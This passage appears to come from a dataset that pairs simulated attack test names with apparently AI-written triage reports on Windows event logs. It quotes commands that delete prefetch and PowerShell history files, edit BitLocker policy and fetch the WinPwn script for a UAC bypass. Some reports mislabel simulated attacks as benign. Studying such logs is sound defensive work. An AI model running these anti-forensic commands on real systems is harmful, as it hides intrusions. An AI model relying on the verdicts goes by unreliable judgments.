   - The processes are executed with a user context of `SERVER002\admin_test` with `High` Integrity Level, which has implications for privilege. Some of the processes like `whoami.exe` and `cmd.exe` were executed with administrative privileges, denoting possible privilege escalation attempts or reconnaissance activities.
   - The `whoami.exe` command used by `SERVER002\admin_test` also seems aligned with reconnaissance to affirm the user's context on the system.

4. **Time Change Events**:
   - The system logs reflect frequent time changes within the same second. Time manipulation can be used to confuse event logging, hide malicious activity, or conform logs to a certain narrative for forensic analysis confusion. However, it could also result from a legitimate system adjustment; further investigation would be necessary here.

### Assessment and Resolution:

Given the above observations, notably:
- Frequent and rapid execution of `wevtutil.exe` which can imply tampering with event logs.
- The security or system change commands, like `bcdedit /set safeboot network`, which indicate potentially malicious intent.
- High privileges associated with suspicious commands like `bcdedit` and `whoami`.

These elements suggest a pattern that could be consistent with malicious behavior, particularly around potential tampering with logs and setting up the system for compromised states.

### Resolution:

**MALICIOUS** - The logs exhibit clear activity indicative of an attempt to manipulate system configurations for potentially malicious purposes. Immediate investigation and precautionary measures should be taken.

### Guidance on How to Proceed:

1. **Containment**:
   - Ensure that the affected host, Server002, is isolated from the network to prevent potential lateral movement or further malicious actions.
   
2. **Investigation**:
   - Conduct a forensic analysis on the host to determine the full scope of activities, looking for malware or unauthorized tools.
   - Review user `admin_test`'s activity for any unauthorized processes or network activity.
    
3. **Remediation**:
   - Remove any malicious files or unauthorized changes found on the host.
   - Consider rolling back any suspect configuration changes such as boot settings.
   
4. **Prevention**:
   - Implement stricter logging and monitoring to detect similar activities in real-time.
   - Educate users, especially those with administrative rights, about securing their credentials and systems.
   
Immediate attention and action are recommended to mitigate any potential risks stemming from this activity."
InstallUtil Uninstall method call - -U variant,"Upon examining the provided event logs, there are a few key points to consider:

1. **PowerShell Activity**:
   - The logs indicate the execution of PowerShell scripts utilizing the `Invoke-BuildAndInvokeInstallUtilAssembly` function. This is noteworthy because the use of such functions can sometimes be associated with malicious activity, especially if used to evade detection by executing code through uncommon paths or reflecting over the filesystem (e.g., using the InstallUtil method).
   - The script is running from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`). Attackers frequently use temporary directories to conduct operations, as these locations are often less monitored.
   - The script checks the output of an installation process against the expected output and throws an error if it does not match. This type of activity might signal testing or debugging of potentially unauthorized installations.

2. **Sysmon Logs**:
   - PowerShell (Event ID: 1, 5) shows repeated invocations in a short span of time, with related processes like `InstallUtil.exe`, `csc.exe`, and `cvtres.exe`, commonly seen together in executing PowerShell based payloads or compiling .NET assemblies on the fly.
   - The fact that these processes are being executed alongside PowerShell suggests that code compilation or execution may be occurring, emphasizing the potentially suspicious nature of this activity.
   - Process lineage shows PowerShell being spawned from `wsmprovhost.exe`, typically associated with Windows Remote Management, which could suggest remote access or command execution if not appropriately justified by administrative tasks.
   - The execution of `InstallUtil.exe` to install or uninstall, especially with obfuscated paths or temporary directories, is often associated with misuse since InstallUtil.exe can run binary files completely, often facilitating privilege escalation or persistence.

3. **User Context**:
   - The actions performed under the `admin_test` account on `SERVER002` suggest elevated permissions. If these actions were not executed by a legitimate administrator or part of expected administrative tasks, they could indicate misuse or compromise.
   
4. **Absence of Critical System Logs in Event Review**:
   - Lack of logs in the Security and System sections might imply either log evasion attempts or simply lack of relevant activity being logged due to configured policies.

**Assessment:**

- **SUSPICIOUS**: The behavior observed in the logs appears suspicious due to the use of PowerShell scripts that involve invoking dynamic code execution methods like InstallUtil, and from temporary directories, which are typically flagged for investigation. The rapid execution and chaining of processes like `csc.exe`, `cvtres.exe`, and `InstallUtil.exe` add to the suspicion that these operations might be part of an illicit effort to execute or install unauthorized components.
  
**Guidance Moving Forward:**

- Verify the legitimacy of the `admin_test` user account actions at the time these logs were generated.
- Review other systems and application logs that may provide further context about this activity, if available.
- Search for other instances or files related to `data.004.dll` to determine if any related binaries have been deployed.
- Consider augmenting PowerShell script logging and monitoring to capture more detailed execution data, which could aid in detecting similar behavior in the future.
- Review current security configurations for changes or vulnerabilities that might have been exploited."
Ursnif Malware Registry Key Creation,"Upon detailed analysis of the provided Windows event logs across various channels—including System, Sysmon, Application, and Security—a few observations can be made regarding the potential for malicious activity:

1. **Time Synchronization Events**:
   - Multiple logs reference time change events (Event ID 24 in Kernel-General and Event ID 4616 in Security), indicating possible changes to the system time. Both log mentions of `svchost.exe` are related to these activities, which via `Microsoft-Windows-Time-Service`, refer to time synchronization, a regular activity.

2. **Process Execution**:
   - There are several executions of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`. While these utilities are legitimate, frequent execution of `wevtutil.exe` could be concerning if intended to manipulate event logs. However, these are often used for querying event logs legitimately.
   - The execution of `cmd.exe` with a command to add a registry key (Sysmon Event ID 1): This behavior seems atypical and possibly hostile, as it modifies the registry, which might be a sign of persistence attempts. The key being added under `HKCU\Software\AppDataLow\Software\Microsoft\` with binary data is not usual for standard operations.

3. **Command-Line Arguments**:
   - Execution of `HOSTNAME.EXE` and `whoami.exe` also appears. These utilities provide system and user information and do not inherently signify malicious intent but can indicate reconnaissance activity. They are often seen together with other suspicious activities in an intrusion scenario.
   - The specific `cmd.exe` command line adding a registry key with binary data could hint at malicious configuration or initialization; this seems more aligned with behaviors often noted in malware operations.

4. **Integrity Levels and Users**:
   - The processes executed mentioned a ""High"" integrity level, which indicates they have administrative privileges. The user `SERVER002\admin_test` appears throughout these logs and would need validation to ensure this account's credentials haven't been compromised.

5. **No Specific Indicators of Compromise**:
   - No specific indicators strongly suggest a known malicious payload or process, such as unusual file paths, clear privilege escalation, or the presence of `powershell.exe` commands, known exploit tools, or other red flags typically observed in host compromises.

**Assessment and Conclusion**:
While most of the observed activities could be part of administrative tasks or due to specific scripts set by system administrators, the registry modification via `cmd.exe` stands out as potentially suspicious, as it doesn't relate to typical behavior usually documented in administrative practices.

**Resolution**: **SUSPICIOUS**

This scenario requires further investigation to determine intent:
- Verify the purpose and legitimacy of the `SERVER002\admin_test` user's activities and the command execution trail.
- Cross-reference with network traffic logs to see if there were outbound connections around the time of the events from unusual destinations.
- Review previous logs to detect if similar registry modifications have occurred in the past and establish if they belong to standard operation procedures or potential malicious behavior."
WinPwn - UAC Bypass ccmstp technique,"Upon examining the provided Windows event logs, several indicators suggest suspicious and potentially malicious activity:

1. **PowerShell Usage and UAC Bypass:**
   - Multiple PowerShell logs indicate the execution of a command designed to bypass User Account Control (UAC) using the `ccmstp` technique. This method is commonly used by attackers to escalate privileges on a system without triggering UAC prompts.
   - The PowerShell commands involve downloading and executing a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This indicates the execution of potentially harmful remote scripts, which could be used to perform various malicious activities.

2. **Interesting Sysmon Events:**
   - Sysmon logs show the execution of PowerShell with parameters that match those from the PowerShell log, providing further evidence of potentially malicious scripting activity.
   - The command line in the process creation event includes execution of `calc.exe`, which is often used as a placeholder for testing UAC bypasses in real-world attacks.

3. **Unusual Process and Command Line Activity:**
   - The presence of a user account ""admin_test"" executing sensitive commands, downloading scripts, and bypassing security measures is concerning if not known or expected behavior in this environment.

Given these findings, it is evident that the activity observed in the logs does not appear benign. The presence of remote script execution and UAC bypass attempts strongly indicates a compromise or an attempted compromise of the system.

**Recommendation and Resolution:**
- Perform a detailed forensic analysis, including checking the integrity of the system and confirming the legitimacy of the ""admin_test"" account.
- Examine network traffic logs around the time of these events to determine if other communications relate to the suspicious PowerShell activities.
- Review system and file integrity to check for unauthorized changes.
- Evaluate current security configurations to prevent similar incidents, such as enabling PowerShell logging and restricting script execution policies.

**Resolution: MALICIOUS**"
Disable .NET Event Tracing for Windows Via Registry (powershell),"Upon analyzing the given event logs, here is a breakdown of observations and a detailed assessment:

### Windows PowerShell Log:

- **PowerShell Activity**: The logs indicate multiple PowerShell events, all related to the execution of `New-ItemProperty` to modify the registry key `ETWEnabled` under `HKLM\Software\Microsoft\.NETFramework`. The command is executed using `powershell.exe`, which could be a legitimate administrative task. However, altering registry keys, especially related to the .NET Framework, can be indicative of attempts to manipulate or evade .NET Framework logging. This action could potentially disable Event Tracing for Windows (ETW) for .NET applications, which may be used for stealth by malicious actors.

### System Log:

- **Time Changes**: Events indicate that the system time was changed, evident from Kernel-General events (ID 1) showing different old and new times. The time reset is associated with `svchost.exe`. Programmatic time changes, especially when frequent or unexplained, can be used to evade detection of malware activities aligning logs with false time metrics.

### Sysmon Log:

- **Process Execution Patterns**: Several processes executed by the user `admin_test` such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. `wevtutil.exe` is typically used for event log management and could be leveraged for malicious purposes such as clearing logs after unauthorized actions. The frequent execution of `conhost.exe` and utility applications (`whoami.exe`, `hostname.exe`) may imply an exploration or reconnaissance attempt, but on its own does not strongly indicate malicious behavior.
  
- **High Integrity Level Processes**: The execution of PowerShell with high integrity indicates administrative privileges, which is a common requirement for malicious actions like lateral movement or privilege escalation.

### Security Log:

- **Time Change Auditing**: The security auditing confirms the time changes logged in the system log indicating legitimate time adjustments; however, without a clear justification or business reason, this may still warrant additional scrutiny.

### Application Log:

- **Software Protection Platform Service**: Logging from `sppsvc.exe` implies normal activity related to software licensing enforcement. While this activity in isolation is benign, its presence in this context should be considered with the entire environment's situation.

### Assessment:

While no single log entry strongly indicates definitive malicious activity, several aspects raise suspicion:

1. **Registry Modification via PowerShell**: The modification of registry settings related to .NET Framework diagnostic features can be an attempt to conceal malicious activity.
   
2. **Frequent Time Changes**: Time modification activities can be suspicious, especially when associated with registry changes and administrative-level PowerShell commands.

3. **Usage of Utilities**: The execution of admin tools and command-line utilities, along with altered logging settings, suggests potential reconnaissance or post-exploitation activity.

### Resolution:

**SUSPICIOUS** - The activity observed in the logs, particularly concerning PowerShell and registry changes combined with frequent time modifications, appears unusual and worthy of further investigation to rule out any malicious intent or misconfiguration.

### Guidance:

1. **Conduct a Detailed Forensic Analysis**: Capture and analyze memory and disk images of `Server002` to detect any in-memory malware and to examine the full context of registry modifications.

2. **Review User Activities**: Examine user `admin_test`'s activities closely, including reviewing recent access patterns, authentication logs, and any other administrative tasks performed.

3. **Monitor ETW and PowerShell Activity**: Implement enhanced monitoring for PowerShell scripting activities and registry changes, and ensure PowerShell logging is set to a detailed level for future capture.

4. **Assess the Environment for Abnormal Behavior**: Evaluate network traffic and identify any unusual patterns indicating potential data exfiltration or lateral movement.

By following the above guidance, potential threats can be effectively managed, minimizing risk and ensuring security integrity."
LOLBAS Msedge to Spawn Process,"Upon analyzing the provided logs, here is a detailed breakdown of the findings:

1. **Suspicious PowerShell Execution:**
   - The logs show several entries of PowerShell being used with a command that involves launching Microsoft Edge and then spawning the `calc.exe` process using the `--gpu-launcher` switch. This behavior is unusual and suspicious as it includes command-line arguments that manipulate the execution of Edge in a way that is not typical for standard operations.

2. **Repeated Calculator Launch:**
   - A large number of `calc.exe` (Calculator) processes were spawned in a short timeframe. This is evidenced by several Sysmon log entries showing calc.exe being executed with a command line argument that ties it back to Edge's `--gpu-launcher` feature. The rapid and repetitive execution of `calc.exe` without a clear legitimate purpose further adds to the suspicion that this action is automated and potentially malicious.

3. **Taskkill Commands:**
   - The PowerShell script includes `taskkill` commands to forcibly terminate both the Edge and Calculator processes. This behavior is indicative of an attempt to clean up processes for concealment or automated task completion, which is a common tactic in malicious scripts.

4. **Edge Update Service:**
   - Near the end of the logs, there are entries showing activity related to Microsoft Edge Update processes. While these could be benign, their timing in relation to the suspicious PowerShell activity may warrant a closer examination to determine if the update process was leveraged as a means for persistence or privilege escalation.

**Assessment:**

Based on the available evidence, the observed activity exhibits characteristics of potentially malicious behavior. The execution of PowerShell scripts with Edge and Calculator, accompanied by suspicious command-line arguments and process management commands (using `taskkill`), raises significant red flags. The use of Edge's `--gpu-launcher` to run `calc.exe` in such a manner suggests unauthorized use of legitimate applications for unintended purposes, a common technique in malware and exploit tactics.

**Resolution: SUSPICIOUS**

Given the above findings, the activity appears suspicious and warrants further investigation to confirm its nature. It would be prudent to:
- Conduct a deeper forensic analysis to identify the source of the PowerShell script and its execution.
- Review user activity and access logs around the time of these events.
- Examine system integrity and identify any other signs of compromise.
- Monitor subsequent updates and network activity that could be related to this behavior. 

It's important to consider this activity as potentially malicious unless proven otherwise by additional context from system users or further investigation into the system state and network communications at the time of these events."
Modify UsePartialEncryptionKey Registry entry,"Upon reviewing the provided logs, several observations and analysis conclusions can be made:

### Suspicious or Anomalous Behavior:
1. **Time Change Events**: There are events in both the System and Security logs indicating a system time change initiated by `svchost.exe`. 
   - **System Log Event ID: 1** and **Security Log Event ID: 4616**: Indicate system time was changed. While a time change is not inherently malicious, it can be used to hide activities, tamper with time-based security mechanisms, or evade detection by altering event timestamps.
   
2. **Registry Modification Through `cmd.exe`**:
   - Logs show that `cmd.exe` is invoked with command-line arguments to modify the registry (Sysmon EventID 1, Process Image: `C:\\Windows\\System32\\cmd.exe`).
   - The command `reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f` indicates a policy change for BitLocker encryption settings. This is a significant security configuration change and could indicate compromise if it wasn’t performed by an authorized administrator for legitimate purposes.

### Malicious Activity or Compromise Indicators:
1. **Suspicious Registry Modification**: The modification of a critical security setting like BitLocker without a valid change request or approval is anomalous and potentially malicious.
2. **Time Change**: Coupled with registry changes could suggest an attempt to cover tracks or align system time for particular exploits.

### Assessment:
- **Registry Modification**: Unauthorized registry changes, especially those affecting security features like BitLocker, can indicate preparation for future malicious activities or compromise attempts.
- **Time Change**: While an isolated time change might not be alarming, in conjunction with other suspicious activities, it heightens concerns.

### Resolution: SUSPICIOUS
Given the evidence of system time manipulation alongside unauthorized registry changes affecting security configurations, the logs should be considered **SUSPICIOUS**. Further investigation is warranted.

### Guidance on How to Proceed:
1. **Verify Authorization**: Verify if any authorized user or administrator conducted these changes. Check with IT or security teams for any legitimate system maintenance or updates during the specified time.
2. **User Validation**: Determine if `SERVER002\\admin_test` had legitimate reasons to execute the observed commands.
3. **Increase Monitoring**: Enhance logging and monitoring on critical systems for further suspicious behavior.
4. **Security Audit**: Conduct a full security audit of the affected system to identify potential compromises.
5. **Review Network Traffic**: Check for any unusual outbound traffic patterns or remote connection attempts that coincide with the time of these events.

It is recommended to perform these actions promptly to ensure system integrity and mitigate potential risks."
Requires the BitLocker PIN for Pre-boot authentication,"Based on the provided logs, let's analyze each component for any indicators of malicious activity:

### Sysmon Log Analysis

1. **Process Execution:**
   - **whoami.exe** and **hostname.exe** are legitimate system utilities. Their execution might be used in scripts or administrative tasks but isn't inherently malicious.
   - **conhost.exe** is a console host process, often seen accompanying other command line tools. Its presence itself is expected.
   - **MicrosoftEdgeUpdate.exe** and **svchost.exe** are also legitimate, running as part of typical Windows operations or updates.

2. **Command Execution:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f` potentially modifies registry settings related to advanced startup. While modifying registry isn't inherently malicious, registry changes can be part of malicious activities if not in line with standard operations.
   
3. **Execution of wevtutil.exe:**
   - The repeated execution of **wevtutil.exe**, another legitimate tool, could suggest attempts to manipulate event logs. However, without additional context on the command line for these executions, confirmatory evidence of malicious intent is absent.

### System Log and Time Change Analysis

- **Time Adjustment Events:**
  - There are log entries where system time was adjusted. Legitimate time updates may come from syncing with time.windows.com. Ensure the adjustments align with configured time sources to mitigate attempts to hide activity by changing timestamps.

### Security Log Events

- **Time Change Events (EventID 4616):**
  - This correlates with the system event time changes and initially may not indicate malicious behavior, as time adjustments could be routine. They need cross-verification for alignment with legitimate network time protocol (NTP) sources.

### Assessment and Resolution

- **Registry Modifications:**
  - Reg.exe operations modifying the system registry can be part of administrative tasks; however, they could signify malicious intent if unauthorized, especially related to boot settings.

- **Process Analysis:**
  - No evidence of processes that are traditionally associated with malware was found. All noted processes are genuine Windows components.

- **Indicators of Compromise (IOCs):**
  - No known IOCs appear connected to these logs. The entries represent standard processes, system utilities, or updates with legitimate use in Windows environments.

**Final Resolution: SUSPICIOUS**

The activities in logs could be benign administrative actions, but features like registry modifications and the repeated use of **wevtutil.exe** require further investigation due to their potential misuse in obfuscation or persistence strategies. Check if these actions were part of expected administrative tasks and ensure proper security permissions and roles were adhered to concerning these registry changes and time adjustments. Additionally, verify if the observed activity aligns with typical patterns or if further correlation with other security data sources (like EDR or SIEM) shows more context or unusual patterns outside typical baselines."
Disable Microsoft Defender Firewall via Registry,"### Analysis of Log Entries

#### Time Manipulation:
1. **Security Log Event ID 4616 & System Log Event ID 1:**
   - Both events indicate time changes on the server. In the security log, the time change is recorded near the time events and in the system log with Event ID 1.
   - Time discrepancy: The logged ""NewTime"" appears to be set before the ""PreviousTime"".
   - Time changes can indicate potential evasion techniques, especially when not associated with an OS update or legitimate maintenance.

2. **Logging on and Privilege Escalation:**
   - **Security Log Event ID 4624 and 4672:**
     - `admin_test` logging in with NTLM authentication from IP `192.168.0.102`, commonly internal.
     - Privileged access granted to `admin_test` with Event ID 4672, which includes `SeDebugPrivilege`. This is a high-risk privilege that can affect system-level processes.

3. **Suspicious Command Execution:**
   - **Sysmon Log Process Execution:**
     - Execution of `cmd.exe` with an argument to modify Firewall settings (turn it off) can be considered suspicious without a valid reason or documented change request.
     - Commands like this could be indicative of an attacker attempting to disable security measures for further exploitation.

4. **Process Activity:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` by `admin_test` user around the same timestamps.
   - **Sysmon logs, Event ID 1 & 5:**
     - Process creation activities of legitimate system processes like `whoami.exe` and `hostname.exe` appear normal but should be evaluated as potential enumeration techniques.

5. **Network Reconnaissance and Enumeration:**
   - Execution of `whoami.exe` may indicate user reconnaissance commonly performed by an attacker to gather information on user privilege levels.
 
#### Other Observations:
- **Microsoft Edge Update Activity:** 
  - Numerous records of `MicrosoftEdgeUpdate.exe` executions are seen, which might be consistent if an update was in progress. These logs do not directly associate with suspicious activities unless there’s evidence of misuse.

### Assessment
Overall, the observed logs indicate multiple indicators of suspicious activity:
- **Unauthorized Time Change**: Possible attempt to evade detection.
- **Unjustified Privilege Escalation**: `admin_test` has broad privileges.
- **Command Execution to Disable Firewall**: Defensive measures were potentially being tampered with.
- **Reconnaissance Tools Usage (whoami, hostname)**: Detection of what user is logged on, enumeration activity.

### Final Assessment
**Resolution: SUSPICIOUS**

### Guidance on How to Proceed
- **Further Investigation Needed:**
  - Deep investigation into the source of the `admin_test` login, determining if it's legitimate, and verifying any logs in terms of time change.
  - Examine network traffic logs, if available, for any signs of lateral movement or data exfiltration from the host.
  - Check for any additional unauthorized changes in system settings or permissions.
  - Validate if the IP address `192.168.0.102` is usual for `admin_test` login and trace its activities on the network.
- **Immediate Actions:**
  - Consider isolating the server if the suspicion of compromise increases.
  - Review user access controls and disable excessive privileges unless validated.
  - Re-enable and monitor firewall rules that were tampered with.
- **Engagement with Incident Response Team:**
  - A coordinated response with the incident response team to assess potential impacts and scope.

This assessment should ensure the monitoring and evaluation of the server for any further anomalous behavior."
Delete a single file - Windows cmd,"Based on the provided logs, here is the analysis:

### Sysmon log analysis:
1. **cmd.exe executions**:
   - Multiple instances of `cmd.exe` are being executed with high integrity privilege.
   - The commands include checks for the existence of a file `deleteme_data.004`, modification by writing to it, and deletion of the same file using the `/f` (force) flag: 
     - `cmd.exe /c IF EXIST ""%temp%\\deleteme_data.004"" ( EXIT 0 ) ELSE ( EXIT 1 )`
     - `cmd.exe /c echo deleteme_data.004 >> %%temp%%\\deleteme_data.004`
     - `cmd.exe /c del /f %%temp%%\\deleteme_data.004`
   - The context of operations on a `deleteme_data.004` file may indicate usage for a temporary or cleanup script, possibly benign but strange without more context.

2. **wevtutil.exe**:
   - `wevtutil.exe` is observed multiple times. This utility is used to manage Event Logs.
   - Usage of `wevtutil.exe` can be part of legitimate system management, but frequent usage without administrative commands is questionable.
   
3. **Command-line parentage**:
   - Parent processes are mostly `wsmprovhost.exe`, which indicates the Windows Remote Management (WinRM) provider, suggesting these might be remote commands.
   
### Security log analysis:
- **Event ID 4616**:
  - Indicates a change in system time. The time was adjusted by `svchost.exe` under the identity of “LOCAL SERVICE”.
  - Time changes can be legitimate (e.g., synchronization) but may also indicate an anti-forensic attempt to confuse timeline analysis.

### Application log analysis:
- **SPP Event ID 16384**:
  - Indicates normal operations related to the Software Protection Platform Service.

### System log analysis:
- **Kernel-General & Time-Service**:
  - Shows a synchronization of time which correlates with the Security logs' indication of time change.
  - This suggests that the time adjustment is likely a legitimate background task by the operating system.

### Conclusion:
All observed events have identifiable and justified explanations, such as script execution for clean-up and time adjustments as typical sync tasks. While the repeated execution of command-line operations could be unusual, it could align with scheduled maintenance tasks or system scripts.

### Resolution: BENIGN
The activity observed does not indicate clear evidence of malicious behavior. However, it would be prudent to confirm with the applicable IT or operations teams if these tasks are scheduled or part of maintenance procedures. Continue monitoring for any escalation of similar or related activity."
Delete Prefetch File,"Upon analyzing the provided Windows event logs, the following points have been identified:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution**:
   - The logs show a PowerShell command being executed which deletes the oldest file in the `C:\Windows\prefetch` directory using the following command:
     ```powershell
     powershell.exe & {Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])}
     ```
   - The `prefetch` directory contains information about the performance of running applications, and attempts to clean or manipulate this directory can be suspicious as attackers might do this to cover their tracks.

2. **Process Execution**:
   - Multiple instances of process execution such as `conhost.exe`, `whoami.exe`, `wevtutil.exe`, and `hostname.exe` by the user `admin_test` show typical administrative commands being run. The combination and frequency might indicate automated or scripted actions rather than manual usage.
   - Frequent instances of `wevtutil.exe` are noted, possibly indicating log management activities which can be used by attackers to tamper with event logs.

3. **Credential Access Events (Event ID 5379)**:
   - Multiple Event ID 5379 entries indicate attempts to access or enumerate credential information using an account linked to Microsoft services which has a failed read operation return code `3221226021`. While this could occur during system checks, the number and frequency might require further validation to rule out unauthorized credential access attempts.

### Indicators of Malicious Activity or Compromise:

1. **PowerShell Execution for File Deletion**:
   - The specific deletion of prefetch files leveraging PowerShell is indicative of an attempt to conceal program execution history, which is a common tactic used by malicious actors after gaining access to a system.

2. **Command-Line Usage and Process Execution**:
   - The use of `wevtutil.exe` by `admin_test` to possibly tamper with or clear event logs can be a sign of malicious activity intending to erase traces of an attack.

### Assessment:
- The activities observed in the logs are indicative of potentially unauthorized activities. Specifically, the PowerShell command to delete prefetch files and the usage of administrative tools suggest possible malicious intent to hide activities and manage Windows logs.

### Resolution:
- **SUSPICIOUS** - The logs contain activities that are suspicious, notably the PowerShell usage and credential access attempts. Immediate review and investigation into the user account `admin_test` are warranted to determine if these actions were legitimate administrative tasks or if they indicate a breach.

### Guidance on How to Proceed:
1. **Immediate Actions**:
   - Conduct a thorough audit of user roles and access logs for `admin_test`.
   - Review execution policies and restrictions for PowerShell to prevent unauthorized script execution.
   - Cross-check the execution of `wevtutil.exe` with administrative tasks to verify authenticity.
   
2. **Monitoring**:
   - Enhance monitoring of similar PowerShell commands and system utilities on sensitive directories.
   - Continuously monitor event logs for anomalous patterns in process execution and credential access.

3. **Investigation**:
   - Collect additional logs and context to trace any unauthorized access attempts or lateral movement activities in the network.
   - Perform a security assessment on the system for any signs of unauthorized modifications. 

By following these steps, further clarity on the nature of these activities can be obtained, helping to address potential security concerns comprehensively."
Clear Powershell History by Deleting History File,"Upon reviewing the provided Windows event logs, I have conducted a comprehensive analysis with the focus on identifying any signs of suspicious or anomalous behavior, potential indicators of compromise, and possible malicious activity. Below is the detailed assessment:

### System Log Analysis
- The System log records events primarily related to time changes handled by the `svchost.exe` process as the `LOCAL SERVICE`. The time changes seem benign and are typically observed when synchronizing with a time server. There are no indications of privilege escalation or anomalous behavior related to these events.

### Application Log Analysis
- A single entry related to the Software Protection Platform (`sppsvc.exe`) service suggests it operated normally. This event is standard on Windows systems and there are no signs of compromise within this context.

### Security Log Analysis
- The Security log entries (`EventID 4616`) also correspond to time change activities, often connected with time synchronization processes, carried out by `LOCAL SERVICE`. This appears routine and expected.

### PowerShell Log Analysis
- A sequence of events indicates PowerShell activity involving the command: `powershell.exe & {Remove-Item (Get-PSReadlineOption).HistorySavePath}`. This command attempts to delete the PowerShell history file, which could be considered suspicious. However, without further malicious context, it might be a legitimate maintenance or cleanup operation, though it is atypical and warrants further investigation.

### Sysmon Log Analysis
- Sysmon logs record multiple process creations involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`, executed by `SERVER002\admin_test`. The presence of `wevtutil.exe` and `whoami.exe` may hint at administrative tasks or attempts to query system information. The use of these tools is not inherently malicious but could potentially indicate reconnaissance or log manipulation activities.
- A notable entry is the execution of `powershell.exe` with a command to delete PowerShell history, which aligns with the entries found in the PowerShell logs. This could signal an attempt to cover tracks.
- `TiWorker.exe` and `TrustedInstaller.exe` are noted; they are legitimate system processes commonly seen in Windows updates or system maintenance activities.

### Assessment and Conclusion
Several indicators warrant closer scrutiny:
1. Use of `powershell.exe` to remove the history file is non-standard and often associated with attempts to obfuscate activities.
2. The execution of `wevtutil.exe` could be benign, but frequent use may suggest attempts to manipulate event logs.
3. The sequence and timing of these processes indicate a pattern that could merit deeper investigation to rule out malicious activity.

**Final Resolution: SUSPICIOUS**

### Recommended Actions:
- Conduct a deeper forensic analysis on the PowerShell activities, especially the ones deleting history or interacting with system logs.
- Track the actions of the user account `SERVER002\admin_test` to verify if these activities align with authorized administrative tasks.
- Review endpoint security measures to ensure sufficient logging and alerting are in place for unusual PowerShell and administrative tool usage.
- Consider engaging with the user of `SERVER002\admin_test` to discern whether these actions were intended and legitimate.

This analysis identifies patterns that could be indicative of attempts to cover tracks or perform reconnaissance. As always, corroborating additional contextual information and cross-referencing with other system behaviors are essential for a comprehensive security assessment."
WMIC bypass using local XSL file,"Upon reviewing the provided logs, here is a detailed analysis:

### Security Log:
- **Event ID 4624 & 4672:** These events are related to successful logon and special privileges assignment for the SYSTEM account. The logon type is 5, which indicates a service logon—normal behavior for system-related accounts.
- **Event ID 5379:** Indicates unsuccessful attempts to read credentials for Microsoft Accounts with return code `3221226021`, suggesting failure to access or invalid session—no immediate red flags concerning compromise.
- **Event ID 4798:** Queries for local group membership with a SYSTEM account and caller process `taskhostw.exe`. While extensive account lookup might be anomalous, this activity alone does not directly point to malicious intent.

### Sysmon Log:
- Numerous instances of **PowerShell** executing as `SERVER002\admin_test` can be indicative of script execution or manual administration tasks.
- Multiple instances of `conhost.exe` and `wevtutil.exe` suggesting legitimate console activities or logmanaging activities, though frequent execution can warrant further investigation to ensure no suspicious scripts are running.
- Use of **WMIC** by `cmd.exe` suggests script execution for system administration tasks, but given the frequency, it's prudent to check if this activity aligns with any known operational tasks.
- Use of calculator (`calc.exe`) by `WMIC` parent process is benign, usually a test or a mistake.
  
- Numerous processes belonging to Microsoft Edge Update services, indicating routine update checks or installation—the EDGE update processes chains seem legitimate.
- High-integrity process executions and legitimate service processes (`taskhostw.exe`, `svchost.exe`, `sc.exe`) align normally within a Windows environment for system tasks.

### Application Log:
- Events captured are related to Edge update service stopping, which aligns with normal operation patterns post-upgradation.

### Overall Assessment:
- No clear indicators of compromise, such as privilege escalation attempts or known malicious tool executions (e.g., Mimikatz, Metasploit), have been identified in the available logs.
- The activity captured involves SYSTEM (NT AUTHORITY) operations that align with standard service and system update management tasks. While there are unsuccessful credential read attempts, these alone aren't indicative of a breach.

### Resolution:
- **BENIGN:** The logs don't present any clear evidence of malicious activities. The behaviors observed appear consistent with routine system administration and update tasks. Nonetheless, continued monitoring should remain in place to identify if activity frequency deviates further or if new patterns appear.

### Guidance:
- Although the current logs don't show malicious activity, consider implementing improved auditing or alerting on specific patterns, such as repetitive denied access attempts, or unusually frequent use of command line tools by specific users for an added layer of precaution."
Invoke CHM with default Shortcut Command Execution,"Upon reviewing the provided logs, let's break down any suspicious or anomalous behavior and assess whether there's any indication of malicious activity or compromise.

### Analysis

1. **PowerShell Logs:**
   - A PowerShell command is executed with the `Invoke-ATHCompiledHelp` function. This particular function name appears non-standard and potentially obfuscated. Using PowerShell with unconventional commands can point toward attempts to execute unauthorized scripts or malware.
   - The command is executed under `admin_test` context with high integrity, which suggests elevated privileges are being used to perform this operation.

2. **Sysmon Logs:**
   - Multiple instances of standard Windows processes such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe` are executed by the `admin_test` account.
   - The PowerShell instance (`powershell.exe`) correlates with the suspicious execution found in the PowerShell logs.
   - Processes such as `wevtutil.exe` are used for event log manipulation and could be leveraged by an attacker to clear logs or gather event data. Frequent use of such processes warrants further investigation, especially under elevated privileges.

3. **Application Logs:**
   - The event from the ""Software Protection Platform Service"" does not indicate any immediate sign of compromise and deals primarily with license management.

### Assessment

- The core concern arises from the PowerShell commands executed and logged by Sysmon as originating from an administrative account. The use of potentially obfuscated or unconventional PowerShell commands, especially those invoking scripts, can indicate an attempt to execute unauthorized scripts or malware.
- The series of processes initiated under the `admin_test` account, including multiple command-line executions without clear context, further support the need for a deeper investigation into these activities.

### Resolution

**Resolution: SUSPICIOUS**

The combination of PowerShell activity with potentially obfuscated script names and the execution of processes like `wevtutil.exe` and `powershell.exe` under elevated privileges is suspicious and warrants a deeper investigation. It's necessary to verify the source and authorization of these actions to rule out potential compromise or execution of malicious scripts.

### Guidance on How to Proceed

1. **Investigate the Source:**
   - Identify the origin of the `Invoke-ATHCompiledHelp` command and validate whether it's a legitimate activity.
   - Examine user account `admin_test` for any unauthorized accesses or changes.

2. **Check for Indicators of Compromise:**
   - Look into any scripts, scheduled tasks, or files associated with `Test.chm` referenced in the PowerShell command to ensure they are not malicious.
